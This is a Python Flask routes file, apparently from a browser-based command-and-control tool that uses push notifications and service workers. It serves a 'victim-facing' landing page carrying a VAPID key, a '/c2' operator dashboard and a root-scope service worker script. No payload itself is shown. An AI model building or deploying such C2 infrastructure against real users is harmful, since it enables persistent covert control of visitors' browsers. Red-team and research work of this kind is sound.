"""
Main routes - landing pages
"""
from flask import Blueprint, render_template
from utils.vapid import get_vapid_public_key

main_bp = Blueprint('main', __name__)


@main_bp.route('/')
def index():
    """Victim-facing landing page"""
    return render_template('victim.html', vapid_public_key=get_vapid_public_key())


@main_bp.route('/c2')
def dashboard():
    """C2 operator dashboard"""
    return render_template('dashboard.html')

@main_bp.route('/sw.js')
def service_worker():
    """Serve service worker from root"""
    from flask import send_from_directory
    import os
    
    # Debug: print what path we're using
    project_root = os.path.abspath(os.path.dirname(__file__) + '/..')
    sw_path = os.path.join(project_root, 'sw.js')
    
    print(f"[DEBUG] Looking for sw.js at: {sw_path}")
    print(f"[DEBUG] File exists: {os.path.exists(sw_path)}")
    
    return send_from_directory(project_root, 'sw.js', mimetype='application/javascript')
